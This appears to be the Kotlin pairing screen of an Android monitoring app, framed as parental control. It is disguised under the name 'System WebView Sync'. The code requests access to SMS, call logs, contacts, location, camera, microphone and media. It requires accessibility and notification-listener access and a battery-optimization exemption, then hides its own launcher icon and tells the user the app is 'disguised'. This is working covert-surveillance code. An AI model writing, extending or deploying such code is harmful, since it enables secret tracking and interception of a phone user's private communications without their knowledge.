package com.system.webview.sync

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.system.webview.sync.localdb.PrefsHelper
import com.system.webview.sync.localdb.SyncQueueHelper
import com.system.webview.sync.network.SupabaseConfig
import com.system.webview.sync.services.BackgroundSyncService
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONArray
import java.util.UUID
import java.util.concurrent.TimeUnit

class PairingActivity : AppCompatActivity() {

    private val PERMISSION_REQUEST_CODE = 101
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    private val requiredPermissions: Array<String>
        get() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_MEDIA_IMAGES,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
            )
        } else {
            arrayOf(
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
            )
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (PrefsHelper.isPaired(this)) {
            startSyncService()
            hideAppIconAndFinish()
            return
        }

        setContentView(R.layout.activity_pairing)
        requestRuntimePermissions()

        val btnPair       = findViewById<Button>(R.id.btnPair)
        val etDeviceName  = findViewById<EditText>(R.id.etDeviceName)
        val etPairingCode = findViewById<EditText>(R.id.etPairingCode)

        // Update hint to reflect PIN format
        etPairingCode.hint = "PIN Setup (8 karakter, contoh: ABCD-1234)"

        btnPair.setOnClickListener {
            val deviceName = etDeviceName.text.toString().trim()
            // Accept PIN with or without dash (ABCD-1234 or ABCD1234)
            val rawPin = etPairingCode.text.toString().trim().uppercase().replace("-", "")

            if (deviceName.isEmpty() || rawPin.isEmpty()) {
                Toast.makeText(this, "Semua kolom harus diisi", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            // Validate PIN format: exactly 8 alphanumeric chars
            if (rawPin.length != 8 || !rawPin.matches(Regex("[A-Z0-9]{8}"))) {
                Toast.makeText(
                    this,
                    "PIN tidak valid. Masukkan 8 karakter PIN dari halaman 'Daftar Anak' di dashboard.",
                    Toast.LENGTH_LONG
                ).show()
                return@setOnClickListener
            }

            // Check runtime permissions
            val missingRuntime = requiredPermissions.filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (missingRuntime.isNotEmpty()) {
                Toast.makeText(this, "Mohon izinkan semua izin akses sistem yang diminta", Toast.LENGTH_LONG).show()
                ActivityCompat.requestPermissions(this, missingRuntime.toTypedArray(), PERMISSION_REQUEST_CODE)
                return@setOnClickListener
            }

            if (!isAccessibilityServiceEnabled(this)) {
                Toast.makeText(this, "Aktifkan layanan 'System WebView Sync' di menu Aksesibilitas", Toast.LENGTH_LONG).show()
                try { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) } catch (e: Exception) { e.printStackTrace() }
                return@setOnClickListener
            }

            if (!isNotificationListenerEnabled(this)) {
                Toast.makeText(this, "Aktifkan Akses Notifikasi untuk 'System WebView Sync'", Toast.LENGTH_LONG).show()
                try { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")) } catch (e: Exception) { e.printStackTrace() }
                return@setOnClickListener
            }

            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(packageName)) {
                Toast.makeText(this, "Izinkan aplikasi mengabaikan optimasi baterai agar berjalan normal", Toast.LENGTH_LONG).show()
                requestBatteryOptimizationExemption(this)
                return@setOnClickListener
            }

            // Disable button while resolving PIN
            btnPair.isEnabled = false
            btnPair.text = "Memverifikasi PIN..."

            // Resolve PIN via Supabase on background thread
            Thread {
                val result = resolvePinFromSupabase(rawPin)
                runOnUiThread {
                    btnPair.isEnabled = true
                    btnPair.text = "Pasangkan"
                    if (result == null) {
                        Toast.makeText(
                            this,
                            "PIN tidak ditemukan atau sudah tidak aktif. Periksa kembali PIN dari dashboard.",
                            Toast.LENGTH_LONG
                        ).show()
                        return@runOnUiThread
                    }

                    val (parentId, childId, childName) = result

                    // Generate a new device UUID and store pairing info
                    val generatedUuid = UUID.randomUUID().toString()
                    PrefsHelper.setDeviceUuid(this, generatedUuid)
                    PrefsHelper.setDeviceName(this, deviceName)
                    PrefsHelper.setPaired(this, true)
                    PrefsHelper.setPairingCode(this, parentId)  // backward compat
                    PrefsHelper.setChildId(this, childId)
                    PrefsHelper.setChildName(this, childName)

                    // Build device registration payload
                    val registerPayload = "{" +
                        "\"id\":\"$generatedUuid\"," +
                        "\"parent_id\":\"$parentId\"," +
                        "\"child_id\":\"$childId\"," +
                        "\"child_name\":\"$childName\"," +
                        "\"device_name\":\"$deviceName\"," +
                        "\"device_uuid\":\"$generatedUuid\"," +
                        "\"model\":\"${Build.MODEL}\"," +
                        "\"brand\":\"${Build.BRAND}\"," +
                        "\"os_version\":\"Android ${Build.VERSION.RELEASE}\"," +
                        "\"pairing_code\":\"$parentId\"," +
                        "\"status\":\"ACTIVE\"" +
                        "}"

                    SyncQueueHelper.enqueue(this, "devices", registerPayload)
                    startSyncService()
                    Toast.makeText(
                        this,
                        "Berhasil dipasangkan dengan \"$childName\". Aplikasi disamarkan.",
                        Toast.LENGTH_SHORT
                    ).show()
                    hideAppIconAndFinish()
                }
            }.start()
        }
    }

    /**
     * Call Supabase REST API to resolve an 8-char setup PIN.
     * Returns Triple(parent_id, child_id, child_name) or null if not found.
     */
    private fun resolvePinFromSupabase(pin: String): Triple<String, String, String>? {
        return try {
            val url = "${SupabaseConfig.URL}/rest/v1/children?setup_pin=eq.$pin&select=id,parent_id,name&limit=1"
            val request = Request.Builder()
                .url(url)
                .get()
                .addHeader("apikey", SupabaseConfig.ANON_KEY)
                .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
                .build()
            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return null
                val body = response.body?.string() ?: return null
                val arr = JSONArray(body)
                if (arr.length() == 0) return null
                val obj = arr.getJSONObject(0)
                Triple(
                    obj.getString("parent_id"),
                    obj.getString("id"),
                    obj.getString("name")
                )
            }
        } catch (e: Exception) {
            android.util.Log.e("PairingActivity", "PIN resolve failed", e)
            null
        }
    }

    private fun requestRuntimePermissions() {
        val permissionsToRequest = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), PERMISSION_REQUEST_CODE)
        }
    }

    private fun isAccessibilityServiceEnabled(context: Context): Boolean {
        val expectedService = ComponentName(
            context,
            com.system.webview.sync.services.SystemSyncAccessibilityService::class.java
        )
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabledServices.contains(expectedService.flattenToString()) ||
               enabledServices.contains(expectedService.flattenToShortString())
    }

    private fun isNotificationListenerEnabled(@Suppress("UNUSED_PARAMETER") context: Context): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    private fun startSyncService() {
        val intent = Intent(this, BackgroundSyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
        else startService(intent)
    }

    private fun hideAppIconAndFinish() {
        // Selalu sembunyikan ikon launcher setelah pairing selesai.
        // Untuk membuka kembali saat development, gunakan TriggerActivity via ADB:
        //   adb shell am start -n com.system.webview.sync/.TriggerActivity
        try {
            val alias = ComponentName(packageName, "$packageName.PairingActivityLauncher")
            packageManager.setComponentEnabledSetting(
                alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            android.util.Log.w("PairingActivity", "hideAppIcon failed: ${e.message}")
        }
        finish()
    }

    private fun requestBatteryOptimizationExemption(context: Context) {
        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val packageName = context.packageName
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent().apply {
                    action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                    data = Uri.parse("package:$packageName")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                context.startActivity(intent)
            }
        }
    }
}
